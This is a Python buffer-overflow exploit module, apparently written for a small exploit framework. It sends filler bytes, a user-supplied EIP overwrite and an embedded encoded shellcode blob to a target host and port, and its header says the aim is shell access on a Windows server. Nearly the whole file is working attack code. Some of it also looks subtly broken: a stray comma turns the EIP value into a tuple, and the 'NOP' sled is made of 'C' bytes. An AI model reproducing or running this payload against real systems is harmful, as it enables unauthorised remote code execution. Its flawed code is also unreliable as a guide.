####################################
# Author - c00lkidd
#
# Description: This exploit takes
# advantage of the open ports of windows server :
# its a buffer overflows ends shell 
# code and user needs
# to put offset and Eip byte then
# you will get shell access
#
####################################

import socket
from struct import pack
from colorama import *

class Exploit:
    config = {
        "RHOST": {"default": "127.0.0.1", "necessity": True},
        "RPORT": {"default": 4444, "necessity": True},
        "offset":{"default": 2000, "necessity": True},
        "BufferChar":{"default": "A", "necessity": True}
    }
    def show_options(self):
        print(Fore.YELLOW+"Options\t\tNecessity\t\tDefault"+Style.RESET_ALL)
        print(Fore.YELLOW+"-------\t\t---------\t\t-------"+Style.RESET_ALL)
        for key in sorted(self.config.keys()):
            print(Fore.YELLOW+"%s\t\t%s\t\t\t%s" % (
                key, self.config[key]["necessity"], self.get_config(key))+Style.RESET_ALL)
    @staticmethod
    def show_info():
        print(Fore.YELLOW+"\nThis exploit tries to do a buffer \noverflow to the given ip and port"+Style.RESET_ALL)

    def set_config(self, key, value):
        if key in self.config.keys():
            self.config[key]["default"] = value
        else:
            print("No options")
    
    
    def get_config(self, key):
        return self.config[key]["default"]

    def run(self):
        off_set=self.config["offset"]
        EipByte_Access=int(input("Eip> "))
        buf =  b""
        buf += b"\xda\xd5\xd9\x74\x24\xf4\x5b\x33\xc9\xb8\xfa\x3e\x7c"
        buf += b"\x30\xb1\x59\x31\x43\x19\x03\x43\x19\x83\xc3\x04\x18"
        buf += b"\xcb\x80\xd8\x53\x34\x79\x19\x0b\xbc\x9c\x28\x19\xda"
        buf += b"\xd5\x19\xad\xa8\xb8\x91\x46\xfc\x28\x9b\xa7\x8a\x23"
        buf += b"\xf3\x58\x3a\x89\x25\x57\x84\xa2\x16\xf6\x78\xb9\x4a"
        buf += b"\xd8\x41\x72\x9f\x19\x85\xc4\xd5\xf6\x5b\x80\x9e\x5a"
        buf += b"\x4c\xa5\xe3\x66\x6d\x69\x68\xd6\x15\x0c\xaf\xa2\xa9"
        buf += b"\x0f\xe0\xc1\x6a\x30\x01\x06\xda\xbb\x49\xb0\x5e\x72"
        buf += b"\x3d\xfc\x29\xb4\x41\x77\x9d\x3d\xbc\x51\xef\x81\x13"
        buf += b"\x9c\xdf\x0f\x6d\xd9\xd8\xef\x18\x11\x1b\x8d\x1a\xe2"
        buf += b"\x61\x49\xae\xf4\xc2\x1a\x08\xd0\xf3\xcf\xcf\x93\xf8"
        buf += b"\xa4\x84\xfb\x1c\x3a\x48\x70\x18\xb7\x6f\x56\xa8\x83"
        buf += b"\x4b\x72\xf0\x50\xf5\x23\x5c\x36\x0a\x33\x38\xe7\xae"
        buf += b"\x38\xab\xfe\xcf\xc1\x33\xff\x8d\x55\xff\x32\x2e\xa5"
        buf += b"\x97\x45\x5d\x97\x38\xfe\xc9\x9b\xb1\xd8\x0e\xaa\xd6"
        buf += b"\xda\xc1\x14\xb6\x24\xe2\x64\x9e\xe2\xb6\x34\x88\xc3"
        buf += b"\xb6\xdf\x48\xeb\x62\x75\x43\x7b\x87\x89\x51\x74\xff"
        buf += b"\x8b\x55\x9b\xa3\x02\xb3\xcb\x0b\x44\x6c\xac\xfb\x24"
        buf += b"\xdc\x44\x16\xab\x03\x74\x19\x66\x2c\x1f\xf6\xde\x04"
        buf += b"\x88\x6f\x7b\xde\x29\x6f\x56\x9a\x6a\xfb\x52\x5a\x24"
        buf += b"\x0c\x17\x48\x51\x6b\xd7\x90\xa2\x1e\xd7\xfa\xa6\x88"
        buf += b"\x80\x92\xa4\xed\xe6\x3c\x56\xd8\x75\x3a\xa8\x9d\x4f"
        buf += b"\x30\x9f\x0b\xef\x2e\xe0\xdb\xef\xae\xb6\xb1\xef\xc6"
        buf += b"\x6e\xe2\xbc\xf3\x70\x3f\xd1\xaf\xe4\xc0\x83\x1c\xae"
        buf += b"\xa8\x29\x7a\x98\x76\xd2\xa9\x9a\x71\x2c\x2f\xb5\xd9"
        buf += b"\x44\xcf\x85\xd9\x94\xa5\x05\x8a\xfc\x32\x29\x25\xcc"
        buf += b"\xbb\xe0\x6e\x44\x31\x65\xdc\xf5\x46\xac\x80\xab\x47"
        buf += b"\x43\x19\x5c\x3d\x2c\x9e\x9d\xc2\x24\xfb\x9e\xc2\x48"
        buf += b"\xfd\xa3\x14\x71\x8b\xe2\xa4\xc6\x84\x51\x88\x6f\x0f"
        buf += b"\x99\x9e\x70\x1a"


        Buffer=b"".join(self.config["BufferChar"]*off_set)
        EIP=pack("<I", EipByte_Access),
        NOP=b"C"*90


        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.config["RHOST"], self.config["RPORT"]))
        s.send(Buffer+EIP+NOP+buf)
        s.close()
